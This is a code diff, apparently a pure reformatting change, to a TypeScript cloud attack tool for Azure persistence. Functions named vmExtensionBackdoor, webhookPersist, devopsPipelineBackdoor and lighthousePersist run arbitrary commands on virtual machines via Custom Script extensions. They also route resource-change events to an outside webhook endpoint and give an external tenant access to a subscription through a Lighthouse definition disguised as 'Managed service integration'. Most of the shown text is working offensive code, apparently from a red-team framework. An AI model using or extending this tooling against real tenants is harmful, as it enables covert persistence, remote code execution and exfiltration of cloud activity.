@@ -446,8 +446,13 @@ export async function vmExtensionBackdoor(args: string[], timeout: number): Prom
 
   if (method === "list") {
     const rgArgs = rg ? ["--resource-group", rg] : []
-    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType}"], sub, timeout)
-    if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Failed to list VMs: ${vms.stderr.slice(0, 200)}`, findings }
+    const vms = await az(
+      ["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType}"],
+      sub,
+      timeout,
+    )
+    if (vms.exitCode !== 0)
+      return { output: output.join("\n") + `[-] Failed to list VMs: ${vms.stderr.slice(0, 200)}`, findings }
     const vmList = tryJson(vms.stdout) || []
     output.push(`[+] VMs found: ${vmList.length}`)
     for (const v of vmList) {
@@ -481,20 +486,27 @@ export async function vmExtensionBackdoor(args: string[], timeout: number): Prom
   const publisher = os === "windows" ? "Microsoft.Compute" : "Microsoft.Azure.Extensions"
   const extName = os === "windows" ? "CustomScriptExtension" : "CustomScript"
   const extType = os === "windows" ? "CustomScriptExtension" : "customScript"
-  const settings = os === "windows"
-    ? JSON.stringify({ commandToExecute: cmd })
-    : JSON.stringify({ commandToExecute: cmd })
+  const settings =
+    os === "windows" ? JSON.stringify({ commandToExecute: cmd }) : JSON.stringify({ commandToExecute: cmd })
 
   output.push(`[*] Deploying ${extName} to ${vm} (${os})...`)
   const deploy = await az(
     [
-      "vm", "extension", "set",
-      "--vm-name", vm,
-      "--resource-group", rg,
-      "--name", extName,
-      "--publisher", publisher,
-      "--version", "2.1",
-      "--settings", settings,
+      "vm",
+      "extension",
+      "set",
+      "--vm-name",
+      vm,
+      "--resource-group",
+      rg,
+      "--name",
+      extName,
+      "--publisher",
+      publisher,
+      "--version",
+      "2.1",
+      "--settings",
+      settings,
     ],
     sub,
     timeout,
@@ -536,7 +548,9 @@ export async function webhookPersist(args: string[], timeout: number): Promise<H
       const subList = tryJson(subs.stdout) || []
       output.push(`[+] Global event subscriptions: ${subList.length}`)
       for (const s of subList) {
-        output.push(`    ${s.name} — ${s.destination?.endpointType || "unknown"} → ${s.destination?.endpointUrl || s.destination?.endpointBaseUrl || "hidden"}`)
+        output.push(
+          `    ${s.name} — ${s.destination?.endpointType || "unknown"} → ${s.destination?.endpointUrl || s.destination?.endpointBaseUrl || "hidden"}`,
+        )
         output.push(`      Topic: ${s.topic || "N/A"}`)
         output.push(`      Events: ${(s.filter?.includedEventTypes || []).join(", ") || "all"}`)
       }
@@ -556,7 +570,9 @@ export async function webhookPersist(args: string[], timeout: number): Promise<H
 
   if (!name || !endpoint) return { output: "[-] --name and --endpoint required for create", findings }
 
-  const subScope = scope || `/subscriptions/${(await az(["account", "show", "--query", "id", "-o", "tsv"], undefined, timeout)).stdout.trim()}`
+  const subScope =
+    scope ||
+    `/subscriptions/${(await az(["account", "show", "--query", "id", "-o", "tsv"], undefined, timeout)).stdout.trim()}`
 
   output.push(`[*] Creating Event Grid subscription: cs-${name}`)
   output.push(`    Scope: ${subScope}`)
@@ -564,12 +580,19 @@ export async function webhookPersist(args: string[], timeout: number): Promise<H
 
   const create = await az(
     [
-      "eventgrid", "event-subscription", "create",
-      "--name", `cs-${name}`,
-      "--source-resource-id", subScope,
-      "--endpoint", endpoint,
-      "--endpoint-type", "webhook",
-      "--included-event-types", "Microsoft.Resources.ResourceWriteSuccess",
+      "eventgrid",
+      "event-subscription",
+      "create",
+      "--name",
+      `cs-${name}`,
+      "--source-resource-id",
+      subScope,
+      "--endpoint",
+      endpoint,
+      "--endpoint-type",
+      "webhook",
+      "--included-event-types",
+      "Microsoft.Resources.ResourceWriteSuccess",
       "Microsoft.Resources.ResourceDeleteSuccess",
       "Microsoft.Resources.ResourceActionSuccess",
     ],
@@ -620,7 +643,9 @@ export async function devopsPipelineBackdoor(args: string[], timeout: number): P
     const projects = await run("az", ["devops", "project", "list", ...orgArgs, "-o", "json"], timeout)
     if (projects.exitCode !== 0) {
       output.push(`[-] Failed to list projects: ${projects.stderr.slice(0, 200)}`)
-      output.push("[*] Ensure logged in: az devops login / set default org: az devops configure --defaults organization=URL")
+      output.push(
+        "[*] Ensure logged in: az devops login / set default org: az devops configure --defaults organization=URL",
+      )
       return { output: output.join("\n"), findings }
     }
     const projectList = tryJson(projects.stdout)?.value || []
@@ -694,7 +719,9 @@ export async function lighthousePersist(args: string[], timeout: number): Promis
       const defList = tryJson(defs.stdout) || []
       output.push(`[+] Managed service definitions: ${defList.length}`)
       for (const d of defList) {
-        output.push(`    ${d.properties?.managedByTenantName || d.properties?.managedByTenantId || "unknown"} — ${d.properties?.registrationDefinitionName || d.name}`)
+        output.push(
+          `    ${d.properties?.managedByTenantName || d.properties?.managedByTenantId || "unknown"} — ${d.properties?.registrationDefinitionName || d.name}`,
+        )
         const auths = d.properties?.authorizations || []
         for (const a of auths) {
           output.push(`      Principal: ${a.principalId} → ${a.roleDefinitionId}`)
@@ -735,12 +762,19 @@ export async function lighthousePersist(args: string[], timeout: number): Promis
 
   const createDef = await az(
     [
-      "managedservices", "definition", "create",
-      "--name", defName,
-      "--tenant-id", tenantId,
-      "--principal-id", principalId,
-      "--role-definition-id", roleDef,
-      "--description", "Managed service integration",
+      "managedservices",
+      "definition",
+      "create",
+      "--name",
+      defName,
+      "--tenant-id",
+      tenantId,
+      "--principal-id",
+      principalId,
+      "--role-definition-id",
+      roleDef,
+      "--description",
+      "Managed service integration",
     ],
     sub,
     timeout,
@@ -752,11 +786,7 @@ export async function lighthousePersist(args: string[], timeout: number): Promis
 
     const defId = def?.id || def?.name
     if (defId) {
-      const assign = await az(
-        ["managedservices", "assignment", "create", "--definition", defId],
-        sub,
-        timeout,
-      )
+      const assign = await az(["managedservices", "assignment", "create", "--definition", defId], sub, timeout)
       if (assign.exitCode === 0) {
         output.push(`[+] Assignment created — external tenant can now access this subscription`)
         findings.push({
